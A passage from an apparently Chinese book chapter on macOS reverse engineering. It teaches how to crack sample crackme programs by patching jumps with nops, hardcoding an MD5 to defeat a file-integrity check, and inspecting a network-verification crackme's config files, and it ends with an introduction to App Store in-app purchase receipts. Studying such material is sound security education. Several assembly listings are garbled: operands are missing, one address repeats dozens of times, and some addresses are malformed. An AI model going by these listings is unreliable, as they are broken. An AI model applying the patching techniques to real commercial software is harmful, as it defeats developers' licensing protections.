word-wrap: break-word;'>byte [ss:rbp+var_31], cl</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cc9</td><td style='text-align: center; word-wrap: break-word;'>jmp</td><td style='text-align: center; word-wrap: break-word;'>0x100007d79</td></tr></table>

点击Hopper菜单File→Produce New Executable，将所有修改保存为新的文件并替换回去。然后执行破解后的程序。然而，运行结果却失败了，如图9-12所示。

 </div>

只能继续分析查找原因了。使用Hopper查看伪代码，最后找到了关键的地方，如下所示：

//以下代码读取主执行文件的整个文件数据
rax = [var_3B0 mainBundle];
rax = [rax retain];
var_3B8 = rax;
rax = [rax executableURL];
rax = [rax retain];
var_3C0 = rax;
rax = [rax retain];
var_70 = var_3C0;
var_3D0 = var_70;
//_ObjC.NSData._allocating_init (contentsOfURL : _ObjC.NSURL) -> _ObjC.NSData?
rax = _TFCSo6NSDataCfT13contentsOfURLCSo5NSURL_GSqS__(var_3D0, var_3D8);
var_3E8 = rax;
var_88 = var_3E8;
var_400 = var_88;
.....
//以下代码计算主执行文件的md5值
//(extension in CryptoSwift):_ObjC.NSData.md5 () -> _ObjC.NSData
var_408 = _TFE11CryptoSwiftCSo6NSData3md5fT_SO_(var_400);
rax = [var_408 toHexString];
//Foundation._convertNSStringToString (_ObjC.NSString?) -> Swift.String
rax = _TF10Foundation24_convertNSStringToStringFGSqCSo8NSString_SS(rax);
var_410 = rax;
.....
//以下代码读取whoisshe.dat文件的内容
//Swift.String.init()
var_458 = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("whoisshe", 0x8, 0x1, var_410);
var_420);
var_468 = var_418;
if (0x1 == 0x0) {
    var_470 = 0x0;
}
else {
    var_470 = swift_convertStringToNSString(var_458, 0x1, var_468);
}
var_478 = var_470;
var_480 = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("dat", 0x3, 0x1, 0x3);
if (0x1 == 0x0) {
    var_498 = 0x0;
}
else {
    var_498 = swift_convertStringToNSString(var_480, 0x1, 0x3);
}
rdx = var_478;
rcx = var_498;
var_4A0 = var_498;
//pathForResource
rax = [var_3B8 pathForResource:rdx ofType:rcx];
var_4A8 = rax;
//Foundation._convertNSStringToString (_ObjC.NSString?) -> Swift.String
rax = _TF10Foundation24_convertNSStringToStringFGSqCSo8NSString_SS(var_4A8);
//_ObjC.NSData._allocating_init (contentsOfFile : Swift.String) -> _ObjC.NSData?
rax = _TFCSo6NSDataCfT14contentsOfFileSS_GSqS__(var_4E8, var_4F0, var_4F8, var_3D8);

//以下代码构造ChaCha20解密算法类，解密的key为主文件的md5值，iv为“whoisshe”
//type metadata accessor for CryptoSwift.ChaCha20
var_5E8 = _TMaC11CryptoSwift8ChaCha20();
swift_unknownRetain(var_420);
//Swift.String.init()
rax = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("whoisshe", 0x8, 0x1, 0x8);
//CryptoSwift.ChaCha20._allocating_init(key: Swift.String, iv: Swift.String) -> CryptoSwift.ChaCha20?
rax = _TFC11CryptoSwift8ChaCha20CfT3keySS2ivSS_GSqSO_(var_410, var_418, var_420, rax, 0x1, 0x8, var_5E8);
var_600 = rax;

.....
//以下代码构造解密后的whoisshe.dat文件的内容数据，并调用解密ChaCha20算法进行解密
var_630 = swift_getForeignTypeMetadata(_TMVSC27NSDatabase64DecodingOptions + 0x20);
var_638 = _TFs27_allocateUninitializedArrayurFBwTGSax_Bp_(0x0, swift_getForeignTypeMetadata(_TMVSC27NSDatabase64DecodingOptions + 0x20));
var_648 = swift_getForeignTypeMetadata(_TMVSC27NSDatabase64DecodingOptions + 0x20, _TMVSC27NSDatabase64DecodingOptions + 0x20);
rax = swift_getForeignTypeMetadata(_TMVSC27NSDatabase64DecodingOptions + 0x20);
_TFEsPs14SetAlgebraTypeCft12arrayLiteralGSawx7Element_x(var_228, var_638, var_630, var_648, _TWPVSC27NSDatabase64DecodingOptions14SetAlgebraType10Foundation, rax);
//Swift.String, options: _C.NSDatabase64DecodingOptions -> _ObjC.NSData?
rax = _TFCSo6NSDataCfT19base64EncodedStringSS7optionsVSC27NSDatabase64DecodingOptions_GSqS_(var_618, var_620, var_628, var_3D8);
var_650 = rax;

//(extension in CryptoSwift): _ObjC.NSData.arrayOfBytes() -> [Swift.UInt8]
var_670 = _TFE11CryptoSwiftCSo6NSData12arrayOfBytesfT_GSaVs5UInt8_(var_668);
[var_668 release];

//CryptoSwift.ChaCha20.decrypt([Swift.UInt8]) throws -> [Swift.UInt8]
rax = _TFC11CryptoSwift8ChaCha207decryptfzGSaVs5UInt8_GSaS1_(var_670, var_610, 0x0);
rdx = 0x0;

.....
//以下代码根据解密后的NSData数据，构造NSImage对象
var_688 = var_678;
swift_bridgeObjectRetain(var_678);
//(extension in CryptoSwift): _ObjC.NSData.init(bytes: [Swift.UInt8]) -> _ObjC.NSData
rax = _TFE11CryptoSwiftCSo6NSDataCfT5bytesGSaVs5UInt8_SO_(var_688, var_3D8);
var_698 = rax;

//type metadata accessor for _ObjC.NSImage
var_6A0 = _TMaCSo7NSImage();

[var_698 retain];

//_ObjC.NSImage._allocating_init(data: _ObjC.NSData) -> _ObjC.NSImage?
rax = _TFCSo7NSImageCfT4dataCSo6NSData_GSqS_(var_698, var_6A0);
var_6B0 = rax;

从以上代码得知，解密图片数据文件whoisse.dat需要用到whoisse主程序文件的md5值。上面破解失败的原因就在于修改主程序文件后md5值发生了变化。

到这里，就有了新的破解思路。一种是不修改原程序，直接计算正确的用户名与验证码，另一种方式是将原文件的md5值补丁到破解后的程序上，修正它的key值。

分析注册算法，编写注册机的工作就留给读者作为作业吧。此处我们采取暴破的方式，讲解如何修改数据与代码，达到暴力破解的目的。首先，计算原whoisshe程序的md5值，可以使用前面介绍的Rahash2工具，不过这里使用的iHex工具打开程序，点击菜单Tools→Calculate Checksum，如图9-13所示。

 </div>

接下来的工作就是将md5值“8e7c4606bb1d164ac83d5ab5ced08331”补丁到程序中去。在onLook()方法中查找合适的补丁点，字符串的长度是32位，首先需要在程序的cstring节区中查找存放字符串的地方。最终根据代码的暴破点，找到的地址是0x10000ade0，该地址存放的是系统生成的错误字符串信息，长度是32位，下面将其修改成md5值。点击Hopper菜单Window→ShowHexadecimalEditor，打开十六进制编辑器（这款编辑器不支持复制粘贴，需要双击此处的字符串，逐个修改），效果如图9-14所示。

 </div>

修改完后，关上编辑器，在反汇编窗口按键盘上的A键，将修改后的数据格式化字符串。完成操作后，接下来修改反汇编代码。暴破点代码如下：

000000010000421a jmp 0x100004248
000000010000421c lea rdi, qword [ds:0x10000ada2] ; "fatal error", XREF= TFC8whoisshe11AppDelegate6onLookfPs9AnyObject_T_+2190

mov

imp___stubs___TTSf4s_s_d_d___TFs18_fatalErrorMessageFTVs12StaticStringS_S_Su_T_

0000000100003tword [ss:rbp+var_400] ; XREF= _TFC8whoisse11AppDelegate6onLookfPs9AnyObject_T_+2218
000000010000424f  
call  
imp__stubs__TFE11CryptoSwiftCSo6NSData3md5fT_SO_
0000000100004254  
mov  
rdi, qword [ss:rbp+var_400] ; argument "instance" for method
imp_stubs_objc_release
000000010000425b  
mov  
qword [ss:rbp+var_408], rax
0000000100004262  
call  
imp_stubs_objc_release
0000000100004267  
mov  
rsi, qword [ds:0x10000d178] ; @selector(toHexString), argument "selector"
for method imp_stubs_objc_msgSend
000000010000426e  
mov  
rax, qword [ss:rbp+var_408]
0000000100004275  
mov  
rdi, rax ; argument "instance" for method imp_stubs_objc_msgSend
0000000100004278  
call  
imp_stubs_objc_msgSend
000000010000427d  
mov  
rdi, rax ; argument "instance" for method
imp_stubs_objc_retainAutoreleasedReturnValue
0000000100004280  
call  
imp_stubs_objc_retainAutoreleasedReturnValue
0000000100004285  
mov  
rdi, rax
0000000100004288  
call
imp_stubs_TF10Foundation24_convertNSSStringToStringFGSqCSo8NSSString_SS

000000010000421a行的 jmp 0x100004248 指令是跳转执行获取主程序的 md5 值，但下面 000000010000422f 行有一条指令 lea rcx, qword [ds:0x10000ade0]，这是获取 md5 值的指令，可以直接拿来使用，因此，将 000000010000421a 行的 jmp 0x100004248 指令修改为 jmp 0x10000422f，然后构造调用 String 初始化调用：rdi 寄存器存放字符串地址；esi 寄存器存放字符串长度，esi 寄存器存放后面的 isASCII 参数。最后调用 call _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS。然后下面是一些中间参数释放内存的处理，直接 nop 掉即可。最后，修改后的代码如下所示：

000000010000421a jmp 0x10000422f
000000010000421c lea rdi, qword [ds:0x10000ada2] ; "fatal error",
XREF= TFC8whoisshe11AppDelegate6onLookfPs9AnyObject_T_+2190.
0000000100004223 mov eax, 0xb
0000000100004228 mov esi, eax
000000010000422a mov eax, 0x2
000000010000422f lea rcx, qword [ds:0x10000ade0] ; "8e7c4606bb1d164ac83d5ab5ced08331"
0000000100004236 mov rdi, rcx
0000000100004239 nop
000000010000423a nop
000000010000423b nop
000000010000423c nop

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>000000010000423d</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000423e</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000423f</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004240</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004241</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004242</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004243</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004244</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004245</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004246</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004247</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004248</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004249</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000424a</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000424b</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000424c</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000424d</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000424e</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000424f</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004250</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004251</td><td style='text-align: center; word-wrap: break-word;'>mov</td><td style='text-align: center; word-wrap: break-word;'>ecx, 0x20</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004256</td><td style='text-align: center; word-wrap: break-word;'>mov</td><td style='text-align: center; word-wrap: break-word;'>esi, ecx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004258</td><td style='text-align: center; word-wrap: break-word;'>mov</td><td style='text-align: center; word-wrap: break-word;'>edx, 0x1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000425d</td><td style='text-align: center; word-wrap: break-word;'>call</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>imp_stubs_TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004262</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004263</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004264</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004265</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004266</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004267</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004268</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004269</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000426a</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000426b</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000426c</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000426d</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000426e</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000426f</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004270</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004271</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004272</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004273</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004274</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004275</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004276</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004277</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004278</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004279</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000427a</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000427b</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000427c</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000427d</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000427e</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>000000010000427f</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004280</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004281</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004282</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004283</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004284</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004285</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004286</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004287</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004288</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100004289</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000428a</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000428b</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>000000010000428c</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr></table>

全部修改操作完成后，使用Hopper保存修改后的程序，测试运行。效果如图9-15所示，已经成功破解了！

 </div>

#### 9.2.4 防拷贝技术

在防拷贝技术中，防的目标是软件的载体。当软件从授权的载体上复制到新的环境中时，软件就会运行失败。这一技术广泛运用于游戏中，为了防止软件破解后在其他用户的机器上运行，很多游戏厂商都对自家的游戏产品做了防拷贝。用户购买游戏后，必须插入游戏光盘，游戏才能正常运行。除此之外，典型的防拷贝技术还有Windows平台上的硬件加密器（又称为硬件狗），用户安装软件后，必须在电脑上插上USB或插上其他硬件锁，软件的功能才能解码正常运行。

目前，在macOS平台上使用防拷贝技术的游戏与软件还不流行，但随着macOS系统的普及以及市场占用率越来越大，这一方面的软件加密技术将会有所发展。

#### 9.2.5 网络验证

传统的本地验证已经不能满足现代化软件安全的保护标准了，网络验证作为一种更加安全的软件安全验证方式，配合本地验证，可以做到验证算法、验证方式的动态更新，大大地提高了验证的灵活性。

网络验证使用网络服务器计算软件的验证算法, 然后通过网络方式将计算结果回传给客户端的软件。本节的crackme_net是一个网络与本地双重验证的程序, 运行界面如图9-16所示。

 </div>

输入正确的用户名与注册码后，点击“Read!”按钮，会正确地输出来自服务器的数据。与其他程序分析的方式一样，首先需要定位到“Read!”按钮的事件响应代码，并找到用户名与注册码的关键验证算法部分。使用前面介绍的方法，很快定位到关键的代码位置，如下所示：

0000000100002e9e
mov

0000000100002ea5
mov

0000000100002eac
mov

0000000100002eaf
and

0000000100002eb2
mov

0000000100002eb9
mov

for method imp_stubs_swift_unknownRetain

0000000100002ec0
mov

0000000100002ec7
call

0000000100002ecc
mov

for method imp_stubs_swift_unknownRetain

0000000100002ed3
call

0000000100002ed8
mov

0000000100002edf
mov

0000000100002ee6
mov

0000000100002eed
mov

0000000100002ef4
mov

0000000100002efb
mov

0000000100002f02
mov

0000000100002f09
mov

0000000100002f0d
mov

0000000100002f14
call

0000000100002f17
xor

0000000100002f19
test

0000000100002f1b
jne

0000000100002f1d
jmp

0000000100002f22
call

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

0000000100002f22

000

000000100002eb2行获取当前类偏移0xf8处的方法，并进行了调用，如果返回结果不为1，

则弹出注册码错误提示框。显然, 此处是进行注册码验证的地方, 而爆破点就在0000000100002fb行, 将它的指令jne 0x100002f22改成nop就可以了。

再次运行破解后的程序，并随便输入用户名与密码，点击“Read!”提示文件损坏，如图9-17所示。

 </div>

这是一个网络crackme，对付它们可能需要用到网络程序分析工具。首先介绍的是Private Eye $ ^{①} $，这是一款免费的macOS系统进程的网络活动监视器。在分析crackme_net前，需要先运行Private Eye，运行后，再次运行crackme_net，并输入任意的用户名与密码，Private Eye会对crackme_net的网络流量做记录，如图9-18所示。

 </div>

由于软件是免费的，功能上也就显得有些简陋，Private Eye只显示了程序在某个时间点访问了哪个IP地址。要想使用更强大的网络监视功能，可以使用另一款商业收费软件Radio Silence $ ^{②} $，

这款工具还支持网络防火墙功能。使用Radio Silencé监视的结果如图9-19所示。

 </div>

除了显示连接的IP地址，还显示了连接的端口，只是这两款工具都没有显示连接的url以及参数信息。再次使用前面介绍的工具Charles抓包分析，如图9-20所示。

 </div>

这一次显示出了连接的url为https://raw.github.com，但还是无法看到发送与接收到的内容。我们知道了连接的是https的url，在程序中搜索字符串“https”，得到了两个url文件地址：https://raw.github.com/feicong/macbook/master/chapter9/crackme_net/config.json与https://raw.github.com/feicong/macbook/master/chapter9/crackme_net/data.json。直接访问这两个文

件的数据，它们的内容如下：

//config.json
{
    "status" : "0",
    "id" : "fc.crackme-net",
    "filehash" : "98e43546f8e51e94079501fa5356eae0"
}
//data.json
{
    "status" : "0",
    "data" : "ok! you cracked it."
}

看到以上数据内容后，有经验的分析人员基本就不需要再次分析程序了，通过这些数据就可以猜测到，config.json是用来验证程序合法性的，status应该是表示服务器状态，id表示运行的程序的标识，filehash表示文件的Hash值。当config.json验证通过后，接下来访问真实的数据文件data.json。了解了程序的思路后，剩下的就是体力活了。破解的过程这里就不再展开了，破解完成后，运行结果如图9-21所示。

 </div>

在本节讲到的网络程序破解方法中，没有介绍如何进行https数据的嗅探，我们将在下一章讲解如何获取https连接发送与返回的数据。

#### 9.2.6 混合验证

单一的验证方式对软件的保护力度较弱，目前主流的方式是混合验证。受混合验证保护的程序，保护方式往往多种多样，而且这类程序通常会加入一些公开的或者未公开的软件防破解手段。随着软件加密与解密的对抗技术的迭代，软件防破解手段也在不断地升级。常见的反破解技术有方法名混淆、软件壳加密、反动态调试等，我们将在下一章进行介绍。

### 9.3 App Store 内购机制

如今，不同系统平台都有专属的商店应用，Android平台有Google Play，Windows平台有

Windows Store, iOS与macOS平台则有App Store。苹果公司的成功，很大程度上得益于该软件的生活环境App Store。

如何让系统上的软件开发人员真正地受益，是操作系统开发商需要关注的问题。只有系统平台上的软件丰富了，才能吸引更多的用户去使用该操作系统，而只有开发人员在系统上开发的软件能够赚到钱，他们才有动力去为系统开发更多更好的软件。苹果公司的Apple Store就曾经创造了无数软件开发人员的成功神话。而这一切背后，苹果公司首创的软件购买、免费软件内付费，都是它成功的关键所在。

App Store的内购又称为IAP（In-app Purchase），它是所有苹果商店内应用内付费软件使用的基础设施。对于软件开发人员，了解其使用方法与运行机制，对开发高质量的商业软件是很有帮助的。苹果公司没有给出IAP的具体技术细节，但在WWDC大会与SDK的开发文档中详细讲解了如何在软件中集成它。IAP技术基于苹果SDK中的Store Kit，它是系统中的一个框架StoreKit.framework。开发人员通过使用StoreKit提供的API来完成IAP的集成工作。整个框架的工作方式如图9-22所示。

 </div>

苹果的应用内付费支持使用多种类型的程序。

☐ 为基本功能的软件提供付费后的功能更强大的专业版。

☐ 杂志类App购买成功后，支持订阅与下载。

☐ 免费游戏提供付费后等级解锁。

☐ 在线游戏通过付费购买道具或虚拟财产。

测试应用内付费软件的最简单方法就是下载应用内付费的应用，然后观察它们与其他应用之间的区别。由于集成了应用内付费功能的App，只能通过App Store来发布，因此在测试时，需要先从App Store中下载App。可以发现，通过App Store下载的程序与网络发布的程序最直观的不同是：在App Store中下载的程序，在app的Contents/_MASReceipt目录下会有一个receipt文件。其实，这是一个“凭证文件”，软件通过App Store发布成功后，苹果公司会为它维护一份凭证（Receipt），凭证信息以文件形式进行存储，该文件记录了以下信息。

Purchase Information。存放的软件的购买信息。包括软件的Bundle标识符、版本号、唯一标识以及这些属性值的SHA1哈希值。除此之外，它还包含软件的信用记录(Trusted record)与购买记录(Purchase Record)。这些数据使用ASN.1进行编码存放。所有这些信息被称为Receipt Payload。

□ Certificates。存放的Apple Root CA。用于验证Receipt的签名信息。

